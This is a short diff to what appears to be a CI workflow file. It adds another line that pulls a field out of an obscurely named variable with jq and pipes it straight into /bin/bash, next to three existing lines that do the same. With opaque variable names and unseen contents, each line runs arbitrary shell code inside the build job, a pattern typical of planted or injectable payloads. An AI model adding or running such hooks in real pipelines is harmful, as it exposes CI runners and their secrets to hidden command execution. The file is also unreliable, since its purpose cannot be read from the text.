@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$aozh13" | jq -r .lnfim8 | /bin/bash
           echo $gofz158 | jq -r .ycn27800 | /bin/bash
           echo $l2 | jq -r .pf580 | /bin/bash
+          echo $zuo31293 | jq -r .g7 | /bin/bash
 
       - name: Persist output
         if: always()
